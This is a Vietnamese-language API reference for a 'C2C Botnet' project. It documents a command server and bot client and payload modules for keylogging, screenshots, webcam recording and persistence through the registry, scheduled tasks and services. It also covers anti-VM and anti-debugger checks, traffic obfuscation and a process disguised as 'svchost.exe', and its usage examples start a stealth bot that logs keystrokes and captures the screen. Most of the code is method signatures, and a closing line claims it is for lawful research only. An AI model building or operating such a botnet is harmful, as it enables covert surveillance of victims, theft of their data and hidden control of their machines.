# 📚 TÀI LIỆU THAM KHẢO API - HỆ THỐNG C2C BOTNET

## 📋 Mục Lục
- [1. Lớp API Cốt Lõi](#1-lớp-api-cốt-lõi)
- [2. API Máy Chủ](#2-api-máy-chủ)
- [3. API Máy Khách](#3-api-máy-khách)
- [4. API Module Payload](#4-api-module-payload)
- [5. API Tiện Ích](#5-api-tiện-ích)
- [6. API Cấu Hình](#6-api-cấu-hình)
- [7. Sự Kiện và Hàm Gọi Lại](#7-sự-kiện-và-hàm-gọi-lại)
- [8. Xử Lý Lỗi](#8-xử-lý-lỗi)

---

## 1. Lớp API Cốt Lõi

### 🖥️ Lớp ThreadSafeServer

#### Hàm Khởi Tạo
```python
class ThreadSafeServer:
    def __init__(self, 
                 host: str = 'localhost',
                 port: int = 4444,
                 max_clients: int = 100,
                 ssl_enabled: bool = True,
                 rate_limit: int = 100,
                 worker_threads: int = 32,
                 io_threads: int = 16):
        """
        Khởi tạo máy chủ C2C an toàn luồng.
        
        Tham số:
            host: Địa chỉ liên kết máy chủ
            port: Số cổng máy chủ
            max_clients: Số lượng khách tối đa đồng thời
            ssl_enabled: Bật mã hóa SSL/TLS
            rate_limit: Số yêu cầu mỗi phút mỗi khách
            worker_threads: Kích thước nhóm luồng worker
            io_threads: Kích thước nhóm luồng I/O
        """
```

#### Phương Thức Cốt Lõi
```python
def start_server(self) -> None:
    """Khởi động máy chủ C2C với tất cả tính năng bảo mật."""

def stop_server(self) -> None:
    """Tắt máy chủ một cách duyên dáng và dọn dẹp tài nguyên."""

def get_statistics(self) -> Dict[str, Any]:
    """
    Lấy thống kê toàn diện của máy chủ.
    
    Trả về:
        Dict chứa:
        - active_clients: int - Số khách đang hoạt động
        - total_sessions: int - Tổng số phiên
        - data_transferred: int (bytes) - Dữ liệu đã chuyển
        - uptime: float (seconds) - Thời gian hoạt động
        - success_rate: float (percentage) - Tỷ lệ thành công
        - memory_usage: int (bytes) - Sử dụng bộ nhớ
        - cpu_usage: float (percentage) - Sử dụng CPU
    """

def broadcast_command(self, command: str, clients: List[str] = None) -> Dict[str, Any]:
    """
    Gửi lệnh đến nhiều khách.
    
    Tham số:
        command: Chuỗi lệnh để thực thi
        clients: Danh sách ID khách (None = tất cả khách)
        
    Trả về:
        Dict ánh xạ client_id -> phản hồi
    """

def get_client_info(self, client_id: str) -> Optional[Dict[str, Any]]:
    """
    Lấy thông tin chi tiết về khách cụ thể.
    
    Tham số:
        client_id: Định danh duy nhất của khách
        
    Trả về:
        Dict với chi tiết khách hoặc None nếu không tìm thấy
    """
```

#### Quản Lý Kết Nối
```python
@contextmanager
def connection_context(self, client_socket: socket.socket):
    """Trình quản lý ngữ cảnh để xử lý kết nối an toàn."""

def _handle_client(self, client_socket: socket.socket, client_address: tuple) -> None:
    """Phương thức nội bộ để xử lý kết nối khách riêng lẻ."""

def _cleanup_connection(self, client_socket: socket.socket) -> None:
    """Dọn dẹp tài nguyên kết nối khách."""

def disconnect_client(self, client_id: str) -> bool:
    """
    Ngắt kết nối khách cụ thể.
    
    Tham số:
        client_id: Khách cần ngắt kết nối
        
    Trả về:
        True nếu thành công, False nếu ngược lại
    """
```

### 🤖 Lớp ThreadSafeClient

#### Hàm Khởi Tạo
```python
class ThreadSafeClient:
    def __init__(self,
                 server_host: str = 'localhost',
                 server_port: int = 4444,
                 auto_reconnect: bool = True,
                 reconnect_delay: int = 5,
                 max_reconnect_attempts: int = 10,
                 stealth_mode: bool = False):
        """
        Khởi tạo khách an toàn luồng.
        
        Tham số:
            server_host: Địa chỉ máy chủ C2C
            server_port: Cổng máy chủ C2C
            auto_reconnect: Bật tự động kết nối lại
            reconnect_delay: Độ trễ giữa các lần thử kết nối
            max_reconnect_attempts: Số lần thử kết nối lại tối đa
            stealth_mode: Bật chế độ hoạt động ẩn
        """
```

#### Phương Thức Cốt Lõi
```python
def connect_to_server(self, host: str = None, port: int = None) -> bool:
    """
    Kết nối đến máy chủ C2C.
    
    Tham số:
        host: Ghi đè địa chỉ máy chủ mặc định
        port: Ghi đè cổng máy chủ mặc định
        
    Trả về:
        True nếu kết nối thành công
    """

def disconnect(self) -> None:
    """Ngắt kết nối khỏi máy chủ và dọn dẹp."""

def send_command_result(self, command: str, result: str) -> bool:
    """
    Gửi kết quả thực thi lệnh tới máy chủ.
    
    Args:
        command: Lệnh gốc
        result: Kết quả thực thi
        
    Returns:
        True nếu gửi thành công
    """

def execute_command(self, command: str) -> str:
    """
    Thực thi lệnh hệ thống và trả về kết quả.
    
    Args:
        command: Lệnh cần thực thi
        
    Returns:
        Đầu ra lệnh hoặc thông báo lỗi
    """

def get_system_info(self) -> Dict[str, Any]:
    """
    Thu thập thông tin hệ thống toàn diện.
    
    Returns:
        Dict chứa chi tiết hệ thống:
        - hostname, os, architecture
        - cpu_info, memory_info
        - network_interfaces
        - running_processes
        - installed_software
    """
```

---

## 2. API Máy Chủ

### 🔧 Quản Lý Cấu Hình

```python
class ServerConfig:
    def __init__(self):
        """Quản lý cấu hình máy chủ."""
        
    def update_config(self, config: Dict[str, Any]) -> None:
        """Cập nhật cấu hình máy chủ."""
        
    def get_config(self, key: str = None) -> Any:
        """Lấy giá trị cấu hình."""
        
    def validate_config(self) -> List[str]:
        """Xác thực cấu hình hiện tại, trả về lỗi."""
```

### 📊 Thống Kê và Giám Sát

```python
class ServerMonitor:
    def get_real_time_stats(self) -> Dict[str, Any]:
        """Lấy thống kê máy chủ theo thời gian thực."""
        
    def get_client_statistics(self) -> List[Dict[str, Any]]:
        """Lấy thống kê cho tất cả máy khách đã kết nối."""
        
    def get_performance_metrics(self) -> Dict[str, float]:
        """Lấy chỉ số hiệu suất máy chủ."""
        
    def get_security_alerts(self) -> List[Dict[str, Any]]:
        """Lấy các cảnh báo bảo mật gần đây."""
        
    def export_statistics(self, format: str = 'json') -> str:
        """Xuất thống kê theo định dạng chỉ định."""
```

### 🔐 Quản Lý Bảo Mật

```python
class SecurityManager:
    def generate_ssl_certificates(self, 
                                  key_size: int = 2048,
                                  validity_days: int = 365) -> bool:
        """Tạo chứng chỉ SSL mới."""
        
    def validate_ssl_certificates(self) -> Dict[str, Any]:
        """Xác thực chứng chỉ SSL hiện tại."""
        
    def update_cipher_suites(self, ciphers: str) -> None:
        """Cập nhật cấu hình bộ mã hóa SSL."""
        
    def enable_rate_limiting(self, 
                           requests_per_minute: int = 100,
                           block_duration: int = 300) -> None:
        """Cấu hình giới hạn tốc độ."""
        
    def add_ip_to_whitelist(self, ip_address: str) -> None:
        """Thêm IP vào danh sách trắng kết nối."""
        
    def block_ip_address(self, ip_address: str, duration: int = 3600) -> None:
        """Chặn địa chỉ IP trong thời gian chỉ định."""
```

---

## 3. API Máy Khách

### 💻 Hoạt Động Hệ Thống

```python
class SystemOperations:
    def get_system_info(self) -> Dict[str, Any]:
        """Thu thập thông tin hệ thống chi tiết."""
        
    def get_network_info(self) -> Dict[str, Any]:
        """Lấy cấu hình mạng và kết nối."""
        
    def get_process_list(self) -> List[Dict[str, Any]]:
        """Lấy danh sách các tiến trình đang chạy."""
        
    def kill_process(self, pid: int) -> bool:
        """Kết thúc tiến trình theo PID."""
        
    def start_process(self, executable: str, args: List[str] = None) -> int:
        """Khởi động tiến trình mới, trả về PID."""
```

### 📁 Hoạt Động File

```python
class FileOperations:
    def list_directory(self, path: str) -> List[Dict[str, Any]]:
        """Liệt kê nội dung thư mục với metadata."""
        
    def read_file(self, file_path: str, binary: bool = False) -> bytes:
        """Đọc nội dung file."""
        
    def write_file(self, file_path: str, content: bytes) -> bool:
        """Ghi dữ liệu vào file."""
        
    def delete_file(self, file_path: str) -> bool:
        """Xóa file một cách an toàn."""
          def download_file(self, remote_url: str, local_path: str) -> bool:
        """Tải file từ URL."""
        
    def compress_file(self, file_path: str, output_path: str) -> bool:
        """Nén file sử dụng ZIP."""
```

### 🌐 Hoạt Động Mạng

```python
class NetworkOperations:
    def scan_network(self, ip_range: str, ports: List[int] = None) -> List[Dict[str, Any]]:
        """Quét mạng để tìm host hoạt động và cổng mở."""
        
    def check_connectivity(self, host: str, port: int) -> bool:
        """Kiểm tra kết nối mạng tới host:port."""
        
    def get_external_ip(self) -> str:
        """Lấy địa chỉ IP bên ngoài."""
        
    def get_wifi_networks(self) -> List[Dict[str, Any]]:
        """Quét mạng WiFi có sẵn."""
        
    def connect_wifi(self, ssid: str, password: str) -> bool:
        """Kết nối tới mạng WiFi."""
```

---

## 4. API Module Payload

### 📦 Lớp Payload Cơ Bản

```python
class BasePayload:
    def __init__(self, client_instance):
        """Lớp cơ bản cho tất cả module payload."""
        self.client = client_instance
        self.config = {}
        self.running = False
        
    def start(self) -> bool:
        """Khởi động module payload."""
        raise NotImplementedError
        
    def stop(self) -> bool:
        """Dừng module payload."""
        raise NotImplementedError
        
    def configure(self, config: Dict[str, Any]) -> None:
        """Cấu hình tham số module."""
        self.config.update(config)
        
    def get_status(self) -> Dict[str, Any]:
        """Lấy trạng thái và thống kê module."""
        return {
            'running': self.running,
            'config': self.config,
            'last_activity': getattr(self, 'last_activity', None)
        }
```

### ⌨️ API Module Keylogger

```python
class KeyloggerPayload(BasePayload):
    def __init__(self, client_instance):
        super().__init__(client_instance)
        self.buffer_size = 10000
        self.capture_special_keys = True
        
    def start(self) -> bool:
        """Bắt đầu ghi lại phím bấm."""
        
    def stop(self) -> bool:
        """Dừng ghi lại phím bấm."""
        
    def get_captured_keys(self) -> str:
        """Lấy các phím đã ghi lại."""
        
    def clear_buffer(self) -> None:
        """Xóa buffer phím bấm."""
        
    def set_buffer_size(self, size: int) -> None:
        """Đặt kích thước buffer tối đa."""
```

### 📸 API Module Screenshot

```python
class ScreenshotPayload(BasePayload):
    def __init__(self, client_instance):
        super().__init__(client_instance)
        self.quality = 80
        self.interval = 300  # giây
          def take_screenshot(self, 
                       all_monitors: bool = False,
                       quality: int = None) -> bytes:
        """
        Chụp màn hình.
        
        Args:
            all_monitors: Chụp tất cả màn hình
            quality: Chất lượng JPEG (1-100)
            
        Returns:
            Screenshot dưới dạng bytes JPEG
        """        
    def start_scheduled_capture(self, interval: int = 300) -> bool:
        """Bắt đầu chụp màn hình theo lịch."""
        
    def stop_scheduled_capture(self) -> bool:
        """Dừng chụp theo lịch."""
        
    def get_monitor_info(self) -> List[Dict[str, Any]]:
        """Lấy thông tin về các màn hình có sẵn."""
```

### 📹 API Module Webcam

```python
class WebcamPayload(BasePayload):
    def list_cameras(self) -> List[Dict[str, Any]]:
        """Lấy danh sách camera có sẵn."""
        
    def take_photo(self, camera_id: int = 0) -> bytes:
        """Chụp ảnh từ camera chỉ định."""
        
    def record_video(self, 
                    duration: int = 30,
                    camera_id: int = 0,
                    quality: str = 'medium') -> bytes:
        """Quay video trong thời gian chỉ định."""
        
    def start_stream(self, camera_id: int = 0) -> bool:
        """Bắt đầu streaming video."""
        
    def stop_stream(self) -> bool:
        """Dừng streaming video."""
```

### 🔄 API Module Persistence

```python
class PersistencePayload(BasePayload):
    def install_registry_persistence(self, 
                                   executable_path: str,
                                   key_name: str = None) -> bool:
        """Cài đặt persistence dựa trên registry."""
        
    def install_task_persistence(self,
                                executable_path: str,
                                task_name: str = None,
                                trigger: str = 'logon') -> bool:
        """Cài đặt persistence task đã lập lịch."""
        
    def install_service_persistence(self,
                                  executable_path: str,
                                  service_name: str = None) -> bool:
        """Cài đặt persistence dịch vụ Windows."""
        
    def remove_persistence(self, method: str = 'all') -> bool:
        """Xóa các phương thức persistence chỉ định."""
        
    def check_persistence_status(self) -> Dict[str, bool]:
        """Kiểm tra trạng thái của tất cả phương thức persistence."""
```

---

## 5. API Tiện Ích

### 🔐 Tiện Ích Mã Hóa

```python
class CryptoManager:
    def __init__(self, key: bytes = None):
        """Khởi tạo với khóa mã hóa."""
        
    def generate_key(self) -> bytes:
        """Tạo khóa mã hóa mới."""
        
    def encrypt_data(self, data: bytes) -> bytes:
        """Mã hóa dữ liệu sử dụng AES."""
        
    def decrypt_data(self, encrypted_data: bytes) -> bytes:
        """Giải mã dữ liệu đã mã hóa AES."""
        
    def hash_data(self, data: bytes, algorithm: str = 'sha256') -> str:
        """Tạo hash của dữ liệu."""
        
    def generate_rsa_keypair(self, key_size: int = 2048) -> Tuple[bytes, bytes]:
        """Tạo cặp khóa công khai/riêng tư RSA."""
```

### 🛡️ Anti-VM Detection

```python
class VMDetector:    def detect_vm_environment(self) -> Dict[str, Any]:
        """
        Phát hiện môi trường máy ảo.
        
        Returns:
            Dict với kết quả phát hiện:
            - is_vm: bool
            - confidence: float (0-1)
            - indicators: List[str]
            - vm_type: Optional[str]
        """
        
    def check_vm_processes(self) -> List[str]:
        """Kiểm tra các tiến trình liên quan đến VM."""
        
    def check_vm_registry(self) -> List[str]:
        """Kiểm tra registry để tìm dấu hiệu VM."""
        
    def check_vm_files(self) -> List[str]:
        """Kiểm tra hệ thống file để tìm dấu hiệu VM."""
        
    def check_hardware_signatures(self) -> List[str]:
        """Kiểm tra chữ ký phần cứng cho VM."""
```

### 🔍 Bảo Vệ Bộ Nhớ

```python
class MemoryProtector:
    def protect_process_memory(self, pid: int = None) -> bool:
        """Bật bảo vệ bộ nhớ cho tiến trình."""
        
    def detect_debugger(self) -> bool:
        """Phát hiện nếu debugger được gắn kết."""
        
    def anti_dump_protection(self) -> bool:
        """Bật bảo vệ chống dump bộ nhớ."""
        
    def clear_sensitive_memory(self, memory_regions: List[int]) -> None:
        """Xóa an toàn các vùng bộ nhớ nhạy cảm."""
        
    def randomize_memory_layout(self) -> bool:
        """Bật tính năng ngẫu nhiên hóa layout bộ nhớ."""
```

### 🌐 Bảo Vệ Mạng

```python
class NetworkProtector:
    def detect_packet_capture(self) -> bool:
        """Phát hiện nếu lưu lượng mạng đang bị chặn bắt."""
        
    def enable_traffic_obfuscation(self) -> bool:
        """Bật tính năng che giấu lưu lượng mạng."""
        
    def check_proxy_settings(self) -> Dict[str, Any]:
        """Kiểm tra cấu hình proxy hệ thống."""
        
    def detect_network_monitoring(self) -> List[str]:
        """Phát hiện các công cụ giám sát mạng."""
        
    def randomize_traffic_patterns(self) -> None:
        """Ngẫu nhiên hóa các mẫu lưu lượng mạng."""
```

---

## 6. API Cấu Hình

### ⚙️ Cấu Hình Máy Chủ

```python
class ServerConfiguration:
    # Cài đặt mạng
    HOST = '0.0.0.0'
    PORT = 4444
    MAX_CLIENTS = 1000
    
    # Cài đặt SSL/TLS
    SSL_ENABLED = True
    SSL_CERT_PATH = 'server_cert.pem'
    SSL_KEY_PATH = 'server_key.pem'
    SSL_MINIMUM_VERSION = ssl.TLSVersion.TLSv1_2
    
    # Cài đặt threading
    WORKER_THREADS = 32
    IO_THREADS = 16
    CONNECTION_TIMEOUT = 30
    
    # Cài đặt bảo mật
    RATE_LIMIT = 100  # yêu cầu mỗi phút
    ENABLE_IP_WHITELIST = False
    AUTO_BLOCK_SUSPICIOUS_IPS = True
    
    # Cài đặt logging
    LOG_LEVEL = logging.INFO
    LOG_FILE = 'server.log'
    ENABLE_AUDIT_LOG = True
    
    def update_from_dict(self, config: Dict[str, Any]) -> None:
        """Cập nhật cấu hình từ dictionary."""
          def validate(self) -> List[str]:
        """Xác thực cấu hình, trả về danh sách lỗi."""
        
    def save_to_file(self, file_path: str) -> None:
        """Lưu cấu hình vào file."""
        
    def load_from_file(self, file_path: str) -> None:
        """Tải cấu hình từ file."""
```

### 🤖 Cấu Hình Máy Khách

```python
class ClientConfiguration:
    # Cài đặt kết nối
    SERVER_HOST = 'localhost'
    SERVER_PORT = 4444
    AUTO_RECONNECT = True
    RECONNECT_DELAY = 5
    MAX_RECONNECT_ATTEMPTS = 10
    
    # Cài đặt stealth
    STEALTH_MODE = False
    PROCESS_NAME = 'svchost.exe'
    HIDE_WINDOW = True
    ANTI_VM_ENABLED = True
    
    # Cài đặt hoạt động
    COMMAND_TIMEOUT = 60
    HEARTBEAT_INTERVAL = 30
    DATA_COLLECTION_INTERVAL = 300
    
    # Cài đặt persistence
    ENABLE_PERSISTENCE = True
    PERSISTENCE_METHODS = ['registry', 'task_scheduler']
    
    # Cài đặt bảo mật
    ENABLE_ENCRYPTION = True
    OBFUSCATE_TRAFFIC = True
    ENABLE_CERTIFICATE_PINNING = True
```

---

## 7. Sự Kiện và Hàm Gọi Lại

### 📡 Sự Kiện Máy Chủ

```python
class ServerEvents:
    def on_client_connected(self, client_info: Dict[str, Any]) -> None:
        """Được gọi khi máy khách mới kết nối."""
        
    def on_client_disconnected(self, client_id: str, reason: str) -> None:
        """Được gọi khi máy khách ngắt kết nối."""
        
    def on_command_executed(self, 
                          client_id: str,
                          command: str,
                          result: str,
                          execution_time: float) -> None:
        """Được gọi khi việc thực thi lệnh hoàn tất."""
        
    def on_security_alert(self, alert_type: str, details: Dict[str, Any]) -> None:
        """Được gọi khi cảnh báo bảo mật được kích hoạt."""
        
    def on_error(self, error_type: str, error_message: str) -> None:
        """Được gọi khi xảy ra lỗi."""

# Ví dụ sử dụng
def register_event_handlers(server: ThreadSafeServer):
    server.events.on_client_connected = lambda info: print(f"Máy khách mới: {info['hostname']}")
    server.events.on_security_alert = lambda type, details: log_security_event(type, details)
```

### 🤖 Sự Kiện Máy Khách

```python
class ClientEvents:
    def on_connected_to_server(self) -> None:
        """Được gọi khi kết nối thành công tới máy chủ."""
        
    def on_disconnected_from_server(self, reason: str) -> None:
        """Được gọi khi ngắt kết nối khỏi máy chủ."""
        
    def on_command_received(self, command: str) -> None:
        """Được gọi khi nhận lệnh từ máy chủ."""
        
    def on_module_started(self, module_name: str) -> None:
        """Được gọi khi module payload khởi động."""
        
    def on_module_stopped(self, module_name: str) -> None:
        """Được gọi khi module payload dừng."""
```

---

## 8. Xử Lý Lỗi

### ❌ Lớp Exception

```python
class C2CException(Exception):
    """Exception cơ bản cho các hoạt động C2C."""
    pass

class ConnectionError(C2CException):
    """Phát sinh khi kết nối thất bại."""
    pass

class AuthenticationError(C2CException):
    """Phát sinh khi xác thực thất bại."""
    pass

class CommandExecutionError(C2CException):
    """Phát sinh khi thực thi lệnh thất bại."""
    pass

class ModuleError(C2CException):
    """Phát sinh khi hoạt động module payload thất bại."""
    pass

class SecurityError(C2CException):
    """Phát sinh khi phát hiện vi phạm bảo mật."""
    pass

class ConfigurationError(C2CException):
    """Phát sinh khi cấu hình không hợp lệ."""
    pass
```

### 🔧 Ví Dụ Xử Lý Lỗi

```python
# Xử lý lỗi máy chủ
try:
    server = ThreadSafeServer()
    server.start_server()
except ConfigurationError as e:
    logger.error(f"Lỗi cấu hình: {e}")
    sys.exit(1)
except SecurityError as e:
    logger.critical(f"Lỗi bảo mật: {e}")
    server.emergency_shutdown()
except Exception as e:
    logger.exception(f"Lỗi không mong đợi: {e}")

# Xử lý lỗi máy khách
try:
    client = ThreadSafeClient()
    if not client.connect_to_server():
        raise ConnectionError("Không thể kết nối tới máy chủ")
        
    result = client.execute_command("sysinfo")
except ConnectionError as e:
    logger.error(f"Kết nối thất bại: {e}")
    client.attempt_reconnection()
except CommandExecutionError as e:
    logger.warning(f"Thực thi lệnh thất bại: {e}")
    client.send_error_report(str(e))
```

### 📝 API Logging

```python
class LogManager:
    def __init__(self, log_level: int = logging.INFO):
        """Khởi tạo trình quản lý logging."""
        
    def log_event(self, 
                  level: int,
                  message: str,
                  category: str = 'general',
                  client_id: str = None) -> None:
        """Ghi log sự kiện với metadata."""
        
    def log_security_event(self,
                          event_type: str,
                          severity: str,
                          details: Dict[str, Any]) -> None:
        """Ghi log sự kiện liên quan đến bảo mật."""
        
    def log_command_execution(self,
                            client_id: str,
                            command: str,
                            result: str,
                            execution_time: float) -> None:
        """Ghi log việc thực thi lệnh."""
        
    def export_logs(self,
                   start_time: datetime = None,
                   end_time: datetime = None,
                   format: str = 'json') -> str:
        """Xuất logs theo định dạng chỉ định."""
```

---

## 📖 Ví Dụ Sử Dụng

### 🚀 Thiết Lập Máy Chủ Cơ Bản

```python
from core.server import ThreadSafeServer
from utils.logger import LogManager
import logging

# Khởi tạo logging
log_manager = LogManager(logging.INFO)

# Tạo và cấu hình máy chủ
server = ThreadSafeServer(
    host='0.0.0.0',
    port=4444,
    max_clients=500,
    ssl_enabled=True
)

# Đăng ký event handlers
server.events.on_client_connected = lambda info: print(f"Bot mới: {info['hostname']}")
server.events.on_security_alert = lambda type, details: log_manager.log_security_event(type, 'HIGH', details)

# Khởi động máy chủ
try:
    server.start_server()
    print("✅ Máy chủ C2C đã khởi động thành công")
except Exception as e:
    print(f"❌ Không thể khởi động máy chủ: {e}")
```

### 🤖 Thiết Lập Máy Khách Cơ Bản

```python
from client import ThreadSafeClient
from payload.modules.keylogger import KeyloggerPayload
from payload.modules.screenshot import ScreenshotPayload

# Tạo instance máy khách
client = ThreadSafeClient(
    server_host='192.168.1.100',
    server_port=4444,
    stealth_mode=True
)

# Tải các module payload
keylogger = KeyloggerPayload(client)
screenshot = ScreenshotPayload(client)

# Kết nối tới máy chủ
if client.connect_to_server():
    print("✅ Đã kết nối tới máy chủ C2C")
    
    # Khởi động các module payload
    keylogger.start()
    screenshot.start_scheduled_capture(interval=300)
    
    # Vòng lặp chính của máy khách
    client.run()
else:
    print("❌ Không thể kết nối tới máy chủ")
```

### 🔧 Module Payload Tùy Chỉnh

```python
from payload.modules.base import BasePayload
import time
import threading

class CustomDataCollector(BasePayload):
    def __init__(self, client_instance):
        super().__init__(client_instance)
        self.collection_interval = 60
        self.collection_thread = None
        
    def start(self) -> bool:
        """Bắt đầu thu thập dữ liệu."""
        if self.running:
            return False
            
        self.running = True
        self.collection_thread = threading.Thread(target=self._collection_loop, daemon=True)
        self.collection_thread.start()
        return True
        
    def stop(self) -> bool:
        """Dừng thu thập dữ liệu."""
        self.running = False
        if self.collection_thread:
            self.collection_thread.join(timeout=5)
        return True
        
    def _collection_loop(self):
        """Vòng lặp thu thập chính."""
        while self.running:
            try:
                data = self._collect_custom_data()
                self.client.send_data('custom_data', data)
                time.sleep(self.collection_interval)
            except Exception as e:
                self.client.log_error(f"Lỗi thu thập: {e}")
                
    def _collect_custom_data(self) -> dict:
        """Thu thập dữ liệu tùy chỉnh - triển khai logic của bạn ở đây."""
        return {
            'timestamp': time.time(),
            'custom_field': 'custom_value'
        }

# Sử dụng
custom_collector = CustomDataCollector(client)
custom_collector.configure({'collection_interval': 30})
custom_collector.start()
```

---

**© 2025 C2C Botnet Project - API Reference Documentation**

*Tài liệu này cung cấp API reference hoàn chỉnh cho việc phát triển và mở rộng hệ thống C2C Botnet. Vui lòng sử dụng responsibly và chỉ cho mục đích nghiên cứu hợp pháp.*
